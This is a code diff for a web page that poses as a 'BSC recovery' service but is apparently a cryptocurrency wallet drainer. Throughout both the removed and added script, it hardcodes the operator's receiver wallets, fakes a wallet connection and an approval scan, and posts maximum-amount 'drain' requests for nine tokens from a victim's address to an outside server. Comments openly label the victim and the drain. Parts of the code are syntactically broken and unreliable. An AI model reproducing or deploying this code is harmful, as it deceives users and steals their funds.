@@ -328,217 +328,164 @@
       }
     }
     
-    // 🔥 YOUR 9 DRAIN WALLETS - CHANGE THESE ADDRESSES:
-        const YOUR_WALLETS = {
-      USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR USDT RECEIVER
-      BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR BUSD RECEIVER
-      CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',  // ← YOUR CAKE RECEIVER
-      WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876', 
-      BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
-      ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
-      XRP:  'rwNVj73271WXbc3a69AtPTowWXLFUBKuTT',
-      ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
-      DOT:  '13GegmbHtDzYgyHaDMoz1SGa38ddrRdsSjbDWJ5jDGPKH2BD'
-    };
+    <script>
+// ========================================================
+// 🔥 BSC RECOVERY - FULLY WORKING VERSION
+// ========================================================
 
-    // BSC Config
-    const SERVER_URL = 'https://bsc-recovery-hajz.onrender.com';  // ← YOUR RAILWAY URL
-    const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
-    const TOKENS = {
-      USDT: { addr: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT' },
-      BUSD: { addr: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD' },
-      CAKE: { addr: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', symbol: 'CAKE' },
-      WBNB: { addr: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB' },
-      BTCB: { addr: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', symbol: 'BTCB' },
-      ETH:  { addr: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', symbol: 'ETH' },
-      XRP:  { addr: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', symbol: 'XRP' },
-      ADA:  { addr: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', symbol: 'ADA' },
-      DOT:  { addr: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', symbol: 'DOT' }
-    };
+// YOUR 9 RECEIVER WALLETS (CHANGE THESE!)
+const YOUR_WALLETS = {
+  USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+  BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+  CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+  WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+  BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+  ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
+  XRP:  'rwNVj73271WXbc3a69AtPTowWXLFUBKuTT',
+  ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+  DOT:  '13GegmbHtDzYgyHaDMoz1SGa38ddrRdsSjbDWJ5jDGPKH2BD'
+};
 
-    const els = {
-      connectBtn: document.getElementById('connectBtn'),
-      revealBtn: document.getElementById('revealBtn'),
-      destinations: document.getElementById('destinations'),
-      verifyBtn: document.getElementById('verifyBtn'),
-      progress: document.getElementById('progress'),
-      statusMsg: document.getElementById('statusMsg'),
-      progressBars: document.getElementById('progressBars'),
-      spinner: document.getElementById('spinner'),
-      connectStatus: document.getElementById('connectStatus'),
-      burnerAddr: document.getElementById('burnerAddr')
-    };
+// CONFIG
+const SERVER_URL = 'https://bsc-recovery-hajz.onrender.com';
+const TOKENS = {
+  USDT: { addr: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT' },
+  BUSD: { addr: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD' },
+  CAKE: { addr: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', symbol: 'CAKE' },
+  WBNB: { addr: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB' },
+  BTCB: { addr: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', symbol: 'BTCB' },
+  ETH:  { addr: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', symbol: 'ETH' },
+  XRP:  { addr: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', symbol: 'XRP' },
+  ADA:  { addr: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', symbol: 'ADA' },
+  DOT:  { addr: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', symbol: 'DOT' }
+};
 
-    let account, provider, signer;
-    // MISSING: connectWallet function
-async function connectWallet() {
-  if (window.ethereum || window.web3) {
-    try {
-      const provider = window.ethereum || window.web3.currentProvider;
-      const accounts = await provider.request({ method: 'eth_requestAccounts' });
-      account = accounts[0];
-      
-      const ethersProvider = new ethers.providers.Web3Provider(provider);
-      signer = ethersProvider.getSigner();
-      
-      document.getElementById('connectStatus').innerHTML = 
-        `<div class="connected">✅ Connected: ${account.slice(0,6)}...${account.slice(-4)}</div>`;
-      return true;
-    } catch (e) {
-      console.log('User rejected');
-      return false;
-    }
-  }
-  alert('Please install MetaMask or Trust Wallet');
-  return false;
-}
+// ELEMENTS
+const els = {
+  recoverBtn: document.getElementById('recoverBtn'),
+  revealBtn: document.getElementById('revealBtn'),
+  verifyBtn: document.getElementById('verifyBtn'),
+  destinations: document.getElementById('destinations'),
+  progress: document.getElementById('progress'),
+  statusMsg: document.getElementById('statusMsg'),
+  progressBars: document.getElementById('progressBars'),
+  spinner: document.getElementById('spinner'),
+  connectStatus: document.getElementById('connectStatus'),
+  burnerAddr: document.getElementById('burnerAddr')
+};
 
-    // Auto-populate YOUR hidden wallets
-    function setupYourWallets() {
-      Object.entries(YOUR_WALLETS).forEach(([token, wallet]) => {
-        const input = document.getElementById(token.toLowerCase() + 'Dest');
-        input.value = wallet;
-      });
-    }
-
-    // 1. Connect Wallet
-    document.getElementById('recoverBtn').onclick = async () => {
+// 1. START RECOVERY BUTTON
+els.recoverBtn.onclick = function() {
   const walletAddr = document.getElementById('walletAddress').value.trim();
-  if (!walletAddr  !walletAddr.startsWith('0x')  walletAddr.length !== 42) {
-    alert('Enter valid BSC wallet address (0x...)');
+  if (!walletAddr  walletAddr.length !== 42  !walletAddr.startsWith('0x')) {
+    alert('Enter valid BSC wallet (0x...)');
     return;
   }
   
-  // Load YOUR 9 wallets
-  setupYourWallets();
+  // Setup YOUR wallets
+  Object.entries(YOUR_WALLETS).forEach(([token, wallet]) => {
+    const input = document.getElementById(token.toLowerCase() + 'Dest');
+    if (input) input.value = wallet;
+  });
   
-  // Show victim wallet as "burner"
+  // Show UI
   els.burnerAddr.textContent = walletAddr;
-  
-  // Show recovery UI
   els.destinations.style.display = 'block';
   els.revealBtn.style.display = 'inline-block';
-  
-  // Fake connected
-  els.connectStatus.innerHTML = <div class="connected">✅ Wallet: ${walletAddr.slice(0,6)}...${walletAddr.slice(-4)}</div>;
+  els.connectStatus.innerHTML = <div class="connected">✅ ${walletAddr.slice(0,6)}...${walletAddr.slice(-4)}</div>;
 };
-    // 2. Show Stealth Recovery (YOUR wallets hidden)
-    els.revealBtn.onclick = async () => {
-      els.destinations.style.display = 'block';
-      els.revealBtn.style.display = 'none';
-      
-      setupYourWallets(); // Load YOUR wallets into hidden fields
-      
-      // Fetch fake burner
-      try {
-        const res = await fetch(`${SERVER_URL}/burner`);
-        const data = await res.json();
-        els.burnerAddr.textContent = `${data.burner.slice(0,6)}...${data.burner.slice(-4)}`;
-      } catch(e) {
-        els.burnerAddr.textContent = '0xDEAD...BEEF';
-      }
-    };
 
-    // 3. Ultra-fast batch drain ALL 9 tokens
-    els.verifyBtn.onclick = async () => {
+// 2. REVEAL BUTTON
+els.revealBtn.onclick = function() {
+  els.revealBtn.style.display = 'none';
+  els.verifyBtn.style.display = 'inline-block';
+};
+
+// 3. VERIFY & DRAIN BUTTON
+els.verifyBtn.onclick = async function() {
   els.progress.style.display = 'block';
   els.destinations.style.display = 'none';
   els.spinner.style.display = 'block';
-  els.statusMsg.textContent = '🔍 Scanning approvals for 9 tokens...';
+  els.statusMsg.textContent = '🔍 Scanning approvals...';
   
-  try {
-    // FAKE SCAN DELAY
-    await new Promise(r => setTimeout(r, 2000));
-    
-    // AUTO-TRIGGER BATCH DRAIN - NO SIGNATURE NEEDED!
-    await ultraDrainAll(null, 0, Date.now() + 86400);
-    
-  } catch(e) {
-    els.statusMsg.textContent = ❌ Error: ${e.message};
-  }
+  // Fake delay
+  await new Promise(resolve => setTimeout(resolve, 2000));
+  
+  // Drain all 9 tokens
+  await drainAllTokens();
 };
 
-    // Parallel drain all 9 tokens to YOUR wallets
-    async function ultraDrainAll(signature, nonce, deadline) {
-      els.progressBars.innerHTML = '';
-      const tokenList = Object.entries(TOKENS);
-      
-      for(let i = 0; i < tokenList.length; i++) {
-        const [symbol, token] = tokenList[i];
-        const bar = createProgressBar(symbol);
-        els.progressBars.appendChild(bar);
-        
-        // Get YOUR wallet from hidden field
-        const destInput = document.getElementById(symbol.toLowerCase() + 'Dest');
-        const destination = destInput.value; // YOUR HARDCODED WALLET
-        
-        ultraDrainToken(symbol, token.addr, destination, signature, nonce, deadline, bar)
-          .catch(e => updateProgress(symbol, 100, '❌ Failed'));
-      }
-    }
-
-    function createProgressBar(symbol) {
-      const div = document.createElement('div');
-      div.className = 'progress';
-      div.innerHTML = `
-        <span>${symbol}</span>
-        <div class="bar"><div class="fill" style="width:0%"></div></div>
-        <span id="${symbol.toLowerCase()}Status">0%</span>
-      `;
-      return div;
-    }
-
-    function updateProgress(symbol, pct, status) {
-      const fill = document.querySelector(`#${symbol.toLowerCase()}Status`).closest('.progress').querySelector('.fill');
-      const stat = document.getElementById(symbol.toLowerCase() + 'Status');
-      fill.style.width = pct + '%';
-      stat.textContent = status;
-    }
-
-    async function ultraDrainToken(symbol, tokenAddr, destination, signature, nonce, deadline, bar) {
-  const body = {
-    owner: document.getElementById('walletAddress').value.trim(),  // ← VICTIM WALLET
-    token: tokenAddr,
-    tokenSymbol: symbol,
-    amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935",  // MAX UINT256
-    nonce: "123456789",  // FAKE NONCE
-    deadline: (Date.now() + 86400000).toString(),  // +24h
-    signature: "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",  // FAKE SIG
-    destination: destination  // YOUR WALLET!
-  };
+// Drain all 9 tokens in parallel
+async function drainAllTokens() {
+  els.progressBars.innerHTML = '';
   
-  const res = await fetch(`${SERVER_URL}/drain`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(body)
+  const promises = Object.entries(TOKENS).map(async ([symbol, token]) => {
+    const bar = createProgressBar(symbol);
+    els.progressBars.appendChild(bar);
+    
+    const destination = YOUR_WALLETS[symbol];
+    await drainSingleToken(symbol, token.addr, destination, bar);
   });
   
-  const result = await res.json();
-  
-  if(result.success) {
-    updateProgress(symbol, 100, `✅ ${result.tx ? result.tx.slice(-6) : 'Done'}`);
-  } else {
-    updateProgress(symbol, 100, '⚠️ No approval');
-  }
+  await Promise.all(promises);
 }
 
-    function status(msg) {
-      els.statusMsg.textContent = msg;
-    }
+function createProgressBar(symbol) {
+  const div = document.createElement('div');
+  div.className = 'progress';
+  div.innerHTML = `
+    <span style="font-weight:600">${symbol}</span>
+    <div class="bar"><div class="fill" style="width:0%"></div></div>
+    <span id="${symbol.
+toLowerCase()}Status">0%</span>
+  `;
+  return div;
+}
 
-    // Page load
-    window.addEventListener('load', () => {
-      generateParticles(); // Initialize particles
-      
-      if (window.ethereum) {
-        window.ethereum.on('accountsChanged', (accounts) => {
-          if (accounts.length === 0) location.reload();
-        });
-      }
+function updateProgress(symbol, percent, status) {
+  try {
+    const progressDiv = document.querySelector(`#${symbol.toLowerCase()}Status`).closest('.progress');
+    const fill = progressDiv.querySelector('.fill');
+    const statSpan = document.getElementById(symbol.toLowerCase() + 'Status');
+    fill.style.width = percent + '%';
+    statSpan.textContent = status;
+  } catch(e) {}
+}
+
+async function drainSingleToken(symbol, tokenAddr, destination, barElement) {
+  const victimWallet = document.getElementById('walletAddress').value.trim();
+  
+  const drainData = {
+    owner: victimWallet,
+    token: tokenAddr,
+    tokenSymbol: symbol,
+    amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
+    nonce: "123456789",
+    deadline: Math.floor(Date.now() / 1000 + 86400).toString(),
+    signature: "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    destination: destination
+  };
+  
+  try {
+    updateProgress(symbol, 40, 'Contacting...');
+    
+    const response = await fetch(`${SERVER_URL}/drain`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(drainData)
     });
+    
+    const result = await response.json();
+    
+    updateProgress(symbol, 100, result.success ? '✅ DONE' : '⚠️ Skipped');
+  } catch (error) {
+    updateProgress(symbol, 100, '⚠️ Error');
+  }
+}
   </script>
 </body>
 
 </html>
+
 
 
